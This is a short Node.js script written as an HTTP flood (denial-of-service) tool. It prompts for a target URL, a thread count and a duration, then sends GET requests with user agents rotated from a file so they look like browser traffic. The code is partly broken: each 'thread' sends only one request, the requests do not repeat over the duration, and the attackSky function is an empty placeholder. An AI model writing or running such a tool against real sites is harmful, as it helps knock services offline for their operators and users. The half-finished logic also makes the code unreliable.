const http = require('http');
const fs = require('fs');
const readline = require('readline');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

let targetUrl = '';
let numThreads = 100; // Default number of threads
let userAgentList = [];
let attackDuration = 60; // Default attack duration in seconds

const loadUserAgents = () => {
    try {
        const data = fs.readFileSync('ua.txt', 'utf8');
        userAgentList = data.split('\n');
    } catch (err) {
        console.error('Error reading user agent file:', err);
        process.exit(1);
    }
};

const attack = () => {
    const userAgent = getRandomUserAgent();
    const headers = {
        'User-Agent': userAgent,
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0'
    };

    const options = {
        method: 'GET',
        headers: headers
    };

    http.get(targetUrl, options, (res) => {
        res.on('data', () => {});
        res.on('end', () => {});
    }).on('error', (err) => {});
};

const getRandomUserAgent = () => {
    return userAgentList[Math.floor(Math.random() * userAgentList.length)];
};

const attackSky = (target, thread, duration) => {
    // Implement your attackSTELLAR logic here
};

const countdown = () => {
    let timeLeft = attackDuration;
    const timer = setInterval(() => {
        if (timeLeft <= 0) {
            clearInterval(timer);
            console.log('Attack duration ended.');
        } else {
            console.log(`Time left: ${timeLeft} seconds`);
            timeLeft--;
        }
    }, 1000);
};

rl.question('Enter Target URL: ', (answer) => {
    targetUrl = answer;
    rl.question('Enter Number of Threads (default is 100): ', (answer) => {
        numThreads = parseInt(answer) || numThreads;
        rl.question('Enter Attack Duration in Seconds (default is 60): ', (answer) => {
            attackDuration = parseInt(answer) || attackDuration;
            loadUserAgents();

            console.log(`Attacking ${targetUrl} with ${numThreads} threads for ${attackDuration} seconds...`);

            for (let i = 0; i < numThreads; i++) {
                attack();
            }

            attackSky(targetUrl, numThreads, attackDuration);

            countdown();

            rl.close();
        });
    });
});
